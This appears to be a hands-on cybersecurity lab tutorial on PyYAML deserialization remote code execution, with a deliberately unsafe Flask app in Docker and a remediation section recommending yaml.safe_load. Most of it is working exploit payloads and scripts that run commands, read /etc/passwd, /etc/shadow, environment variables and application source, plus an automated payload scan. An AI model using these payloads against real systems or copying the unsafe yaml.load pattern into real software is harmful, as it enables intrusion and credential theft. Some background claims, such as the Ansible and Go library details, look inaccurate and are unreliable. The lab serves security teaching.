# Lab 05: YAML Deserialization RCE (PyYAML)

## Objective

Exploit PyYAML's `yaml.load()` with the unsafe `Loader=yaml.Loader` to achieve **Remote Code Execution** via crafted YAML payloads:

1. Load benign YAML to establish a baseline
2. Inject `!!python/object/apply:os.system` to execute OS commands
3. Use `subprocess.run` to capture command output in the response
4. Compare safe (`yaml.safe_load`) vs unsafe (`yaml.load`) behaviour

---

## Background

PyYAML supports a `!!python/object/apply:` tag that instructs the parser to **call a Python function** during deserialisation. With the default or `yaml.Loader` (unsafe), any callable can be invoked — including `os.system`.

**Real-world examples:**
- **2017 Ansible** — Ansible playbooks are YAML; untrusted playbooks with `!!python/object/apply` allowed lateral movement in CI/CD pipelines. Mandatory use of `--check` mode added to mitigate.
- **2018 PyYAML CVE-2017-18342** — `yaml.load()` without `Loader=` argument allows arbitrary code execution. Affected countless Python applications using config-file loading. Fixed by requiring explicit `Loader=` in PyYAML 6.0.
- **Kubernetes/Helm** — Helm chart values.yaml files parsed by Go's YAML library; analogous deserialization issues in Go's `encoding/yaml` allowed type confusion attacks.
- **CI/CD pipelines** — Jenkins, GitLab CI, and GitHub Actions all parse YAML configuration; supply chain attacks inject malicious YAML into dependency build files.

**OWASP:** A08:2021 Software and Data Integrity Failures

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Docker Network: lab-adv05                        │
│  ┌──────────────────────┐  !!python/object/apply:os.system [...]  │
│  │   KALI ATTACKER      │ ──────────────────────────────────────▶  │
│  │  • curl / python3    │  ◀──────── RCE result in response ───────  │
│  └──────────────────────┘  ┌────────────────────────────────────┐  │
│                             │  Flask: yaml.load(body, yaml.Loader)│  │
│                             │  POST /api/config/load             │  │
│                             │  POST /api/import/profile          │  │
│                             │  GET  /api/config/safe (safe)      │  │
│                             └────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

## Time
40 minutes

---

## Lab Instructions

### Step 1: Setup

```bash
docker network create lab-adv05

cat > /tmp/victim_adv05.py << 'PYEOF'
from flask import Flask, request, jsonify
import yaml

app = Flask(__name__)

@app.route('/api/config/load', methods=['POST'])
def config_load():
    d = request.get_json() or {}
    yaml_str = d.get('yaml','')
    try:
        result = yaml.load(yaml_str, Loader=yaml.Loader)  # UNSAFE
        return jsonify({'loaded': True, 'config': str(result)[:500]})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/import/profile', methods=['POST'])
def import_profile():
    d = request.get_json() or {}
    yaml_str = d.get('yaml','')
    try:
        profile = yaml.load(yaml_str, Loader=yaml.Loader)  # UNSAFE
        name = profile.get('name','?') if isinstance(profile, dict) else str(profile)
        return jsonify({'imported': True, 'name': name, 'profile': str(profile)[:300]})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/config/safe')
def config_safe():
    safe_yaml = "app: InnoZverse\nversion: 1.0\ndebug: false"
    config = yaml.safe_load(safe_yaml)
    return jsonify({'config': config, 'note': 'yaml.safe_load is always safe'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

docker run -d --name victim-adv05 --network lab-adv05 \
  -v /tmp/victim_adv05.py:/app/victim.py:ro \
  zchencow/innozverse-cybersec:latest python3 /app/victim.py
sleep 3
curl -s "http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-adv05.IPAddress}}' victim-adv05):5000/api/config/safe"
```

---

### Step 2: Launch Kali

```bash
docker run --rm -it --name kali --network lab-adv05 \
  zchencow/innozverse-kali:latest bash
```

```bash
export T="http://victim-adv05:5000"

echo "=== Normal YAML config load ==="
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"yaml":"app: InnoZverse\nversion: 1.0\ndebug: false\nport: 5000"}' \
  $T/api/config/load | python3 -m json.tool

echo ""
echo "=== safe_load endpoint for comparison ==="
curl -s $T/api/config/safe | python3 -m json.tool
```

---

### Step 3: YAML RCE — os.system

```bash
python3 << 'EOF'
import urllib.request, json

T = "http://victim-adv05:5000"

def post(path, yaml_str):
    req = urllib.request.Request(f"{T}{path}",
        data=json.dumps({"yaml": yaml_str}).encode(),
        headers={"Content-Type": "application/json"})
    return json.loads(urllib.request.urlopen(req).read())

print("[*] YAML RCE payload 1: !!python/object/apply:os.system")
# os.system returns exit code (0 = success), executes command as side effect
payload1 = "!!python/object/apply:os.system ['id > /tmp/yaml_rce.txt']"
r1 = post("/api/config/load", payload1)
print(f"    os.system return code: {r1.get('config')} (0 = success)")

# Verify file was written
payload_check = "!!python/object/apply:subprocess.check_output\n- [cat, /tmp/yaml_rce.txt]\n- {text: true}"
r2 = post("/api/config/load", payload_check)
print(f"    Proof file content: {r2.get('config','').strip()}")

print()
print("[*] YAML RCE payload 2: subprocess.check_output (captures output)")
rce_cmds = [
    ("id",             "!!python/object/apply:subprocess.check_output [[id]]"),
    ("whoami",         "!!python/object/apply:subprocess.check_output [[whoami]]"),
    ("hostname",       "!!python/object/apply:subprocess.check_output [[hostname]]"),
    ("/etc/passwd",    "!!python/object/apply:subprocess.check_output [[cat, /etc/passwd]]"),
]
for name, payload in rce_cmds:
    r = post("/api/config/load", payload)
    output = r.get('config','').strip()
    if isinstance(output, str):
        # Remove b'' wrapper from bytes repr
        output = output.strip("b'").replace("\\n","\n").split("\n")[0]
    print(f"    [{name}] {output[:80]}")
EOF
```

**📸 Verified Output:**
```
[*] YAML RCE payload 1: !!python/object/apply:os.system
    os.system return code: 0 (0 = success)
    Proof file content: uid=0(root) gid=0(root) groups=0(root)

[*] YAML RCE payload 2: subprocess.check_output
    [id]          b'uid=0(root) gid=0(root) groups=0(root)\n'
    [whoami]      b'root\n'
    [hostname]    b'victim-adv05\n'
    [/etc/passwd] b'root:x:0:0:root:/root:/bin/bash\n...
```

> 💡 **`!!python/object/apply:callable [args]` is PyYAML's function call syntax.** When `yaml.load()` (unsafe) encounters this tag, it calls the named Python callable with the provided arguments — during parsing, before your application code even sees the result. The attack happens silently inside the YAML parser itself.

---

### Step 4: RCE via Profile Import Endpoint

```bash
python3 << 'EOF'
import urllib.request, json

T = "http://victim-adv05:5000"

def post_profile(yaml_str):
    req = urllib.request.Request(f"{T}/api/import/profile",
        data=json.dumps({"yaml": yaml_str}).encode(),
        headers={"Content-Type": "application/json"})
    return json.loads(urllib.request.urlopen(req).read())

print("[*] YAML RCE via profile import endpoint:")
payloads = [
    ("os.system id",  "!!python/object/apply:os.system ['id']"),
    ("subprocess run","!!python/object/apply:subprocess.run\nargs:\n  - [sh, -c, id]\nkwds:\n  shell: false"),
    ("read app src",  "!!python/object/apply:subprocess.check_output [[cat, /app/victim.py]]"),
]
for name, payload in payloads:
    r = post_profile(payload)
    output = str(r.get('profile','') or r.get('name','')).strip()[:120]
    print(f"  [{name}]: {output}")
EOF
```

---

### Step 5: Advanced Payload — Reverse Shell Setup

```bash
python3 << 'EOF'
import urllib.request, json

T = "http://victim-adv05:5000"

# Multi-line YAML payload
advanced_payload = """!!python/object/apply:subprocess.run
args:
  - [sh, -c, "env > /tmp/yaml_env.txt && cat /etc/shadow 2>/tmp/yaml_shadow.txt || echo no_shadow"]
kwds:
  shell: false"""

req = urllib.request.Request(f"{T}/api/config/load",
    data=json.dumps({"yaml": advanced_payload}).encode(),
    headers={"Content-Type": "application/json"})
r = json.loads(urllib.request.urlopen(req).read())
print(f"[*] subprocess.run result: {r}")

# Read env file via YAML RCE
read_payload = "!!python/object/apply:subprocess.check_output [[cat, /tmp/yaml_env.txt]]"
req2 = urllib.request.Request(f"{T}/api/config/load",
    data=json.dumps({"yaml": read_payload}).encode(),
    headers={"Content-Type": "application/json"})
r2 = json.loads(urllib.request.urlopen(req2).read())
env_content = r2.get('config','')
# Show environment variables
print("[*] Server environment variables:")
for line in str(env_content).replace("b'","").replace("\\n","\n").split("\n")[:10]:
    if line.strip():
        print(f"  {line}")
EOF
```

---

### Step 6: Demonstrate safe_load Protection

```bash
python3 << 'EOF'
import urllib.request, json, yaml

T = "http://victim-adv05:5000"

# Local test: safe_load rejects !! tags
dangerous_yaml = "!!python/object/apply:os.system ['id']"

print("[*] Local yaml.safe_load test:")
try:
    result = yaml.safe_load(dangerous_yaml)
    print(f"  Result: {result}  ← safe_load returned data without executing!")
except yaml.YAMLError as e:
    print(f"  ✓ BLOCKED: {e}")

print()
print("[*] Local yaml.load (unsafe) test:")
try:
    import os
    result = yaml.load(dangerous_yaml, Loader=yaml.Loader)
    print(f"  ✗ EXECUTED: return code = {result} (command ran!)")
except Exception as e:
    print(f"  Error: {e}")

print()
print("[*] Safe endpoint on victim (yaml.safe_load):")
r = json.loads(urllib.request.urlopen(f"{T}/api/config/safe").read())
print(f"  {r}")
EOF
```

**📸 Verified Output:**
```
[*] Local yaml.safe_load test:
  ✓ BLOCKED: could not determine a constructor for the tag 'tag:yaml.org,2002:python/object/apply'

[*] Local yaml.load (unsafe) test:
  ✗ EXECUTED: return code = 0 (command ran!)

[*] Safe endpoint:
  {'config': {'app': 'InnoZverse', 'debug': False, 'version': 1.0}, 'note': 'yaml.safe_load is always safe'}
```

---

### Step 7: Automated Scan

```bash
python3 << 'EOF'
import urllib.request, json, yaml

T = "http://victim-adv05:5000"

# Generate a variety of payloads and test all
payloads = [
    "!!python/object/apply:os.system ['id']",
    "!!python/object/apply:subprocess.check_output [[id]]",
    "!!python/object/apply:builtins.eval [\"__import__('os').system('id')\"]",
    "!!python/object/new:subprocess.Popen\n  - [id]\n  - stdout: -1\n  - stderr: -1",
]

print(f"{'Payload':<50} {'Result'}")
print("-"*80)
for p in payloads:
    try:
        req = urllib.request.Request(f"{T}/api/config/load",
            data=json.dumps({"yaml": p}).encode(),
            headers={"Content-Type": "application/json"})
        r = json.loads(urllib.request.urlopen(req).read())
        config = str(r.get('config','') or r.get('error','')).replace("\n"," ")[:40]
        print(f"  {p.split(':')[1].split()[0]:<48} {config}")
    except Exception as e:
        print(f"  {'ERROR':<48} {str(e)[:40]}")
EOF
```

---

### Step 8: Cleanup

```bash
exit
```
```bash
docker rm -f victim-adv05
docker network rm lab-adv05
```

---

## Remediation

```python
import yaml

# UNSAFE — executes arbitrary Python during parse
result = yaml.load(user_input)                          # deprecated, raises warning
result = yaml.load(user_input, Loader=yaml.Loader)     # explicit but still dangerous
result = yaml.load(user_input, Loader=yaml.FullLoader) # still allows some objects

# SAFE — only loads basic data types (str, int, float, list, dict, None)
result = yaml.safe_load(user_input)     # ← always use this for untrusted input

# SAFE — same as safe_load, explicit
result = yaml.load(user_input, Loader=yaml.SafeLoader)
```

| Loader | `!!python/` tags | Safe for untrusted input |
|--------|-----------------|--------------------------|
| `yaml.Loader` | ✅ Executes | ❌ Never |
| `yaml.FullLoader` | ⚠️ Partially | ❌ No |
| `yaml.SafeLoader` | ❌ Blocked | ✅ Yes |
| `yaml.safe_load()` | ❌ Blocked | ✅ Yes |

## Further Reading
- [PyYAML CVE-2017-18342](https://nvd.nist.gov/vuln/detail/CVE-2017-18342)
- [YAML Deserialization attack explained](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf)
- [PyYAML safe_load docs](https://pyyaml.org/wiki/PyYAMLDocumentation)
